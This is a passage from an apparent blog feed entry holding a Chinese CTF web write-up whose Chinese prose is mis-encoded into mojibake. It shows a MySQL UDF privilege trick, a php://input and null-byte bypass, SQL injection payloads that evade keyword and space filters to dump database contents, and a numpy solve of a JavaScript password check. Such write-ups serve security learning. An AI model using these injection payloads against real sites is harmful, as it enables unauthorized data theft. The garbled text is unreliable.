ä¹Ÿæ˜¯æ‹¿æ¥ææƒçš„ï¼Œ</p><p>â€‹    <a href="http://vinc.top/2017/04/19/mysql-udf%E6%8F%90%E6%9D%83linux%E5%B9%B3%E5%8F%B0/">http://vinc.top/2017/04/19/mysql-udf%E6%8F%90%E6%9D%83linux%E5%B9%B3%E5%8F%B0/</a></p><p>â€‹    </p><p>â€‹    å°† udf.so å¯¼å…¥åˆ°MySQLçš„æ’ä»¶é‡Œé¢ï¼Œæ³¨æ„æ”¹ä¸‹æƒé™</p><p>â€‹    mysql> show variables like "%plugin%";</p><p>â€‹    +-------------------------------+------------------------+</p><p>â€‹    | Variable_name                 | Value                  |</p><p>â€‹    +-------------------------------+------------------------+</p><p>â€‹    | default_authentication_plugin | mysql_native_password  |</p><p>â€‹    | plugin_dir                    | /usr/lib/mysql/plugin/ |</p><p>â€‹    +-------------------------------+------------------------+</p><p>â€‹    2 rows in set (0.00 sec)</p><p>â€‹    mysql> create function help_me returns string soname 'udf.so';</p><p>â€‹    Query OK, 0 rows affected (0.00 sec)</p><p>â€‹    mysql> select help_me();</p><p>â€‹    +---------------------------------------------+</p><p>â€‹    | help_me()                                   |</p><p>â€‹    +---------------------------------------------+</p><p>â€‹    | use getflag function to obtain your flag!!  |</p><p>â€‹    +---------------------------------------------+</p><p>â€‹    1 row in set (0.00 sec)</p><p>â€‹    mysql> create function getflag returns string soname 'udf.so';</p><p>â€‹    Query OK, 0 rows affected (0.00 sec)</p><p>â€‹    mysql> select getflag();</p><p>â€‹    +------------------------------------------+</p><p>â€‹    | getflag()                                |</p><p>â€‹    +------------------------------------------+</p><p>â€‹    | PCTF{Interesting_U5er_d3fined_Function}  |</p><p>â€‹    +------------------------------------------+</p><p>â€‹    1 row in set (0.00 sec)</p><h2 id="flagåœ¨ç®¡ç†å‘˜æ‰‹é‡Œ"><a href="#flagåœ¨ç®¡ç†å‘˜æ‰‹é‡Œ" class="headerlink" title="flagåœ¨ç®¡ç†å‘˜æ‰‹é‡Œ"></a>flagåœ¨ç®¡ç†å‘˜æ‰‹é‡Œ</h2><p>â€‹    ç„¶è€Œåˆæ˜¯ hash æ‰©å±•æ”»å‡»ï¼Œä¸åšäº†</p><p>â€‹    <?php </p><p>â€‹    $auth = false;</p><p>â€‹    $role = "guest";</p><p>â€‹    $salt = '32342';</p><p>â€‹    if (isset($_COOKIE["role"])) {</p><p>â€‹        $role = unserialize($_COOKIE["role"]);</p><p>â€‹        $hsh = $_COOKIE["hsh"];</p><p>â€‹        if ($role==="admin" && $hsh === md5($salt.strrev($_COOKIE["role"]))) {</p><p>â€‹            $auth = true;</p><p>â€‹        } else {</p><p>â€‹            $auth = false;</p><p>â€‹        }</p><p>â€‹    } else {</p><p>â€‹        $s = serialize($role);</p><p>â€‹        setcookie('role',$s);</p><p>â€‹        $hsh = md5($salt.strrev($s));</p><p>â€‹        setcookie('hsh',$hsh);</p><p>â€‹    }</p><p>â€‹    if ($auth) {</p><p>â€‹        echo "<h3>Welcome Admin. Your flag is ";</p><p>â€‹    } else {</p><p>â€‹        echo "<h3>Only Admin can see the flag!!</h3>";</p><p>â€‹    }</p><p>â€‹    ?> </p><h2 id="IN-A-Mess"><a href="#IN-A-Mess" class="headerlink" title="IN A Mess"></a>IN A Mess</h2><p>â€‹    <?php</p><p>â€‹        error_reporting(0);</p><p>â€‹        echo "<!--index.phps-->";</p><p>â€‹        if(!$_GET['id']) {</p><p>â€‹            header('Location: index.php?id=1');</p><p>â€‹            exit();</p><p>â€‹        }</p><p>â€‹        $id=$_GET['id'];</p><p>â€‹        $a=$_GET['a'];</p><p>â€‹        $b=$_GET['b'];</p><p>â€‹        if(stripos($a,'.')) {</p><p>â€‹            echo 'Hahahahahaha';</p><p>â€‹            return ;</p><p>â€‹        }</p><p>â€‹        $data = @file_get_contents($a,'r');</p><p>â€‹        if($data=="1112 is a nice lab!" and $id==0 and strlen($b)>5 </p><p>â€‹        and eregi("111".substr($b,0,1),"1114") and substr($b,0,1)!=4) {</p><p>â€‹            require("flag.txt");</p><p>â€‹        }</p><p>â€‹        else {</p><p>â€‹            print "work harder!harder!harder!";</p><p>â€‹        }</p><p>â€‹    ?></p><p>â€‹    payload1: index.php/?id=a&a=php://input&b=%0034253</p><p>â€‹    post: 1112 is a nice lab!</p><p>â€‹    eregi() ä¼šè¢« %00 æˆªæ–­ï¼Œä½† strlen() ä¸ä¼š</p><p>â€‹    ==>  <!--index.phps-->ï¿½Come ON!!! {/^HT2mCpcvOLf}</p><p>â€‹    è¿›å…¥è¯¥ç›®å½•ï¼Œè‡ªåŠ¨è·³è½¬åˆ° web.jarvisoj.com:32780/%5eHT2mCpcvOLf/index.php?id=1</p><p>â€‹    </p><p>â€‹    å‘ç°ç©ºæ ¼è¢«è¿‡æ»¤ï¼Œå°è¯•ç»•è¿‡</p><p>â€‹    - ä½¿ç”¨æ³¨é‡Šç»•è¿‡ï¼Œ/**/</p><p>â€‹    - ä½¿ç”¨æ‹¬å·ç»•è¿‡ï¼Œæ‹¬å·å¯ä»¥ç”¨æ¥åŒ…å›´å­æŸ¥è¯¢ï¼Œä»»ä½•è®¡ç®—ç»“æœçš„è¯­å¥éƒ½å¯ä»¥ä½¿ç”¨ï¼ˆï¼‰åŒ…å›´ï¼Œå¹¶ä¸”ä¸¤ç«¯å¯ä»¥æ²¡æœ‰å¤šä½™çš„ç©ºæ ¼</p><p>â€‹    - ä½¿ç”¨ç¬¦å·æ›¿ä»£ç©ºæ ¼ %20 %09 %0d %0b %0c %0d %a0 %0a</p><p>â€‹    è¿™é‡Œå¯ä»¥ç”¨ /<em>233</em>/ ä»£æ›¿ç©ºæ ¼</p><p>â€‹    </p><p>â€‹    order by æ²¡æœ‰å›æ˜¾ï¼Œæ”¾å¼ƒè¯¥æ³•</p><p>â€‹    /?id=2/<em>233</em>/uunionnion/<em>233</em>/seselectlect/<em>233</em>/1,2,3%23</p><p>â€‹    å¾—åˆ° 3ï¼Œ è¯´æ˜å­—æ®µæ•°ä¹Ÿæ˜¯ 3</p><p>â€‹    payload2: </p><p>â€‹    è·å–æ‰€æœ‰æ•°æ®åº“å</p><p>â€‹    ?id=2/<em>233</em>/uniounionn/<em>233</em>/selselectect/<em>233</em>/1,2,group_concat(schema_name)/<em>233</em>/frfromom/<em>233</em>/information_schema.schemata%23</p><p>â€‹    ==> information_schema,test</p><p>â€‹    è·å–æœ¬æ•°æ®åº“å†…çš„æ‰€æœ‰è¡¨å</p><p>â€‹    ?id=2/<em>233</em>/uniounionn/<em>233</em>/selselectect/<em>233</em>/1,2,group_concat(table_name)/<em>233</em>/frfromom/<em>233</em>/information_schema.tables/<em>233</em>/where/<em>233</em>/table_schema=database()%23</p><p>â€‹    ==> content</p><p>â€‹    ï¼ˆä»¥ä¸Šä¸¤æ­¥å¯çœç•¥ï¼‰</p><p>â€‹    è·å–æ‰€æœ‰å­—æ®µå</p><p>â€‹    ?id=2/<em>233</em>/uniounionn/<em>233</em>/selselectect/<em>233</em>/1,2,group_concat(column_name)/<em>233</em>/frfromom/<em>233</em>/information_schema.columns/<em>233</em>/where/<em>233</em>/table_name=0x636f6e74656e74%23</p><p>â€‹    ==> id,context,title</p><p>â€‹    è·å–æ‰€æœ‰æ•°æ®</p><p>â€‹    ?id=2/<em>233</em>/uniounionn/<em>233</em>/selselectect/<em>233</em>/1,2,group_concat(id,context,title)/<em>233</em>/frfromom/<em>233</em>/content%23</p><p>â€‹    ==> 1PCTF{Fin4lly_U_got_i7_C0ngRatulation5}hi666</p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><p>â€‹    æ˜¯ä¸€ä¸ªè¾“å…¥æ¡†ï¼Œè¾“å…¥å¯†ç ï¼Œæ˜¾ç¤ºå¯†ç é”™è¯¯</p><p>â€‹    æ‰«ä¸åˆ°å…¶ä»–ç›®å½•ï¼Œçœ‹çœ‹æºç ï¼Œæœ‰ä¸ª app.js </p><p>â€‹    æœç´¢ Wrong Password!!</p><p>â€‹    $.post("checkpass.json", t,</p><p>â€‹    function(t) {</p><p>â€‹        self.checkpass(e) ? self.setState({</p><p>â€‹            errmsg: "Success!!",</p><p>â€‹            errcolor: b.green400</p><p>â€‹        }) : (self.setState({</p><p>â€‹            errmsg: "Wrong Password!!"</p><p>â€‹            ......</p><p>â€‹        }))</p><p>â€‹    })</p><p>â€‹    è·Ÿè¿›å»</p><p>â€‹    function(e) {</p><p>â€‹        if (25 !== e.length) return ! 1;</p><p>â€‹        for (var t = [], n = 0; n < 25; n++) t.push(e.charCodeAt(n));</p><p>â€‹        for (var r = [325799, 309234, 317320, 327895, 298316, 301249, 330242, 289290, 273446, 337687, 258725, 267444, 373557, 322237, 344478, 362136, 331815, 315157, 299242, 305418, 313569, 269307, 338319, 306491, 351259], o = [[11, 13, 32, 234, 236, 3, 72, 237, 122, 230, 157, 53, 7, 225, 193, 76, 142, 166, 11, 196, 194, 187, 152, 132, 135], [76, 55, 38, 70, 98, 244, 201, 125, 182, 123, 47, 86, 67, 19, 145, 12, 138, 149, 83, 178, 255, 122, 238, 187, 221], [218, 233, 17, 56, 151, 28, 150, 196, 79, 11, 150, 128, 52, 228, 189, 107, 219, 87, 90, 221, 45, 201, 14, 106, 230], [30, 50, 76, 94, 172, 61, 229, 109, 216, 12, 181, 231, 174, 236, 159, 128, 245, 52, 43, 11, 207, 145, 241, 196, 80], [134, 145, 36, 255, 13, 239, 212, 135, 85, 194, 200, 50, 170, 78, 51, 10, 232, 132, 60, 122, 117, 74, 117, 250, 45], [142, 221, 121, 56, 56, 120, 113, 143, 77, 190, 195, 133, 236, 111, 144, 65, 172, 74, 160, 1, 143, 242, 96, 70, 107], [229, 79, 167, 88, 165, 38, 108, 27, 75, 240, 116, 178, 165, 206, 156, 193, 86, 57, 148, 187, 161, 55, 134, 24, 249], [235, 175, 235, 169, 73, 125, 114, 6, 142, 162, 228, 157, 160, 66, 28, 167, 63, 41, 182, 55, 189, 56, 102, 31, 158], [37, 190, 169, 116, 172, 66, 9, 229, 188, 63, 138, 111, 245, 133, 22, 87, 25, 26, 106, 82, 211, 252, 57, 66, 98], [199, 48, 58, 221, 162, 57, 111, 70, 227, 126, 43, 143, 225, 85, 224, 141, 232, 141, 5, 233, 69, 70, 204, 155, 141], [212, 83, 219, 55, 132, 5, 153, 11, 0, 89, 134, 201, 255, 101, 22, 98, 215, 139, 0, 78, 165, 0, 126, 48, 119], [194, 156, 10, 212, 237, 112, 17, 158, 225, 227, 152, 121, 56, 10, 238, 74, 76, 66, 80, 31, 73, 10, 180, 45, 94], [110, 231, 82, 180, 109, 209, 239, 163, 30, 160, 60, 190, 97, 256, 141, 199, 3, 30, 235, 73, 225, 244, 141, 123, 208], [220, 248, 136, 245, 123, 82, 120, 65, 68, 136, 151, 173, 104, 107, 172, 148, 54, 218, 42, 233, 57, 115, 5, 50, 196], [190, 34, 140, 52, 160, 34, 201, 48, 214, 33, 219, 183, 224, 237, 157, 245, 1, 134, 13, 99, 212, 230, 243, 236, 40], [144, 246, 73, 161, 134, 112, 146, 212, 121, 43, 41, 174, 146, 78, 235, 202, 200, 90, 254, 216, 113, 25, 114, 232, 123], [158, 85, 116, 97, 145, 21, 105, 2, 256, 69, 21, 152, 155, 88, 11, 232, 146, 238, 170, 123, 135, 150, 161, 249, 236], [251, 96, 103, 188, 188, 8, 33, 39, 237, 63, 230, 128, 166, 130, 141, 112, 254, 234, 113, 250, 1, 89, 0, 135, 119], [192, 206, 73, 92, 174, 130, 164, 95, 21, 153, 82, 254, 20, 133, 56, 7, 163, 48, 7, 206, 51, 204, 136, 180, 196], [106, 63, 252, 202, 153, 6, 193, 146, 88, 118, 78, 58, 214, 168, 68, 128, 68, 35, 245, 144, 102, 20, 194, 207, 66], [154, 98, 219, 2, 13, 65, 131, 185, 27, 162, 214, 63, 238, 248, 38, 129, 170, 180, 181, 96, 165, 78, 121, 55, 214], [193, 94, 107, 45, 83, 56, 2, 41, 58, 169, 120, 58, 105, 178, 58, 217, 18, 93, 212, 74, 18, 217, 219, 89, 212], [164, 228, 5, 133, 175, 164, 37, 176, 94, 232, 82, 0, 47, 212, 107, 111, 97, 153, 119, 85, 147, 256, 130, 248, 235], [221, 178, 50, 49, 39, 215, 200, 188, 105, 101, 172, 133, 28, 88, 83, 32, 45, 13, 215, 204, 141, 226, 118, 233, 156], [236, 142, 87, 152, 97, 134, 54, 239, 49, 220, 233, 216, 13, 143, 145, 112, 217, 194, 114, 221, 150, 51, 136, 31, 198]], n = 0; n < 25; n++) {</p><p>â€‹            for (var i = 0, a = 0; a < 25; a++) i += t[a] * o[n][a];</p><p>â€‹            if (i !== r[n]) return ! 1</p><p>â€‹        }</p><p>â€‹        return ! 0</p><p>â€‹    }</p><p>â€‹    å˜æˆäº†ä¸€ä¸ªæ•°å­¦é¢˜ï¼Œè§£çº¿æ€§æ–¹ç¨‹ç»„</p><p>â€‹    import numpy as np</p><p>â€‹    o = [[11, 13, 32, 234, 236, 3, 72, 237, 122, 230, 157, 53, 7, 225, 193, 76, 142, 166, 11, 196, 194, 187, 152, 132, 135], [76, 55, 38, 70, 98, 244, 201, 125, 182, 123, 47, 86, 67, 19, 145, 12, 138, 149, 83, 178, 255, 122, 238, 187, 221], [218, 233, 17, 56, 151, 28, 150, 196, 79, 11, 150, 128, 52, 228, 189, 107, 219, 87, 90, 221, 45, 201, 14, 106, 230], [30, 50, 76, 94, 172, 61, 229, 109, 216, 12, 181, 231, 174, 236, 159, 128, 245, 52, 43, 11, 207, 145, 241, 196, 80], [134, 145, 36, 255, 13, 239, 212, 135, 85, 194, 200, 50, 170, 78, 51, 10, 232, 132, 60, 122, 117, 74, 117, 250, 45], [142, 221, 121, 56, 56, 120, 113, 143, 77, 190, 195, 133, 236, 111, 144, 65, 172, 74, 160, 1, 143, 242, 96, 70, 107], [229, 79, 167, 88, 165, 38, 108, 27, 75, 240, 116, 178, 165, 206, 156, 193, 86, 57, 148, 187, 161, 55, 134, 24, 249], [235, 175, 235, 169, 73, 125, 114, 6, 142, 162, 228, 157, 160, 66, 28, 167, 63, 41, 182, 55, 189, 56, 102, 31, 158], [37, 190, 169, 116, 172, 66, 9, 229, 188, 63, 138, 111, 245, 133, 22, 87, 25, 26, 106, 82, 211, 252, 57, 66, 98], [199, 48, 58, 221, 162, 57, 111, 70, 227, 126, 43, 143, 225, 85, 224, 141, 232, 141, 5, 233, 69, 70, 204, 155, 141], [212, 83, 219, 55, 132, 5, 153, 11, 0, 89, 134, 201, 255, 101, 22, 98, 215, 139, 0, 78, 165, 0, 126, 48, 119], [194, 156, 10, 212, 237, 112, 17, 158, 225, 227, 152, 121, 56, 10, 238, 74, 76, 66, 80, 31, 73, 10, 180, 45, 94], [110, 231, 82, 180, 109, 209, 239, 163, 30, 160, 60, 190, 97, 256, 141, 199, 3, 30, 235, 73, 225, 244, 141, 123, 208], [220, 248, 136, 245, 123, 82, 120, 65, 68, 136, 151, 173, 104, 107, 172, 148, 54, 218, 42, 233, 57, 115, 5, 50, 196], [190, 34, 140, 52, 160, 34, 201, 48, 214, 33, 219, 183, 224, 237, 157, 245, 1, 134, 13, 99, 212, 230, 243, 236, 40], [144, 246, 73, 161, 134, 112, 146, 212, 121, 43, 41, 174, 146, 78, 235, 202, 200, 90, 254, 216, 113, 25, 114, 232, 123], [158, 85, 116, 97, 145, 21, 105, 2, 256, 69, 21, 152, 155, 88, 11, 232, 146, 238, 170, 123, 135, 150, 161, 249, 236], [251, 96, 103, 188, 188, 8, 33, 39, 237, 63, 230, 128, 166, 130, 141, 112, 254, 234, 113, 250, 1, 89, 0, 135, 119], [192, 206, 73, 92, 174, 130, 164, 95, 21, 153, 82, 254, 20, 133, 56, 7, 163, 48, 7, 206, 51, 204, 136, 180, 196], [106, 63, 252, 202, 153, 6, 193, 146, 88, 118, 78, 58, 214, 168, 68, 128, 68, 35, 245, 144, 102, 20, 194, 207, 66], [154, 98, 219, 2, 13, 65, 131, 185, 27, 162, 214, 63, 238, 248, 38, 129, 170, 180, 181, 96, 165, 78, 121, 55, 214], [193, 94, 107, 45, 83, 56, 2, 41, 58, 169, 120, 58, 105, 178, 58, 217, 18, 93, 212, 74, 18, 217, 219, 89, 212], [164, 228, 5, 133, 175, 164, 37, 176, 94, 232, 82, 0, 47, 212, 107, 111, 97, 153, 119, 85, 147, 256, 130, 248, 235], [221, 178, 50, 49, 39, 215, 200, 188, 105, 101, 172, 133, 28, 88, 83, 32, 45, 13, 215, 204, 141, 226, 118, 233, 156], [236, 142, 87, 152, 97, 134, 54, 239, 49, 220, 233, 216, 13, 143, 145, 112, 217, 194, 114, 221, 150, 51, 136, 31, 198]]</p><p>â€‹    r = [325799, 309234, 317320, 327895, 298316, 301249, 330242, 289290, 273446, 337687, 258725, 267444, 373557, 322237, 344478, 362136, 331815, 315157, 299242, 305418, 313569, 269307, 338319, 306491, 351259]</p><p>â€‹    o = np.array(o)</p><p>â€‹    r = np.array(r)</p><p>â€‹    x = np.linalg.solve(o,r)</p><p>â€‹    res = ''</p><p>â€‹    for i in x:</p><p>â€‹        res += chr(int(str(i)[0:-2]))</p><p>â€‹    print(res)</p></script></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;PORT-51&quot;&gt;&lt;a href=&quot;#PORT-51&quot; class=&quot;headerlink&quot; title=&quot;PORT 51&quot;&gt;&lt;/a&gt;PORT 51&lt;/h2&gt;&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=
      
    
    </summary>
    
    
      <category term="Writeup" scheme="https://wywwzjj.top/tags/Writeup/"/>
    
  </entry>
  
</feed>
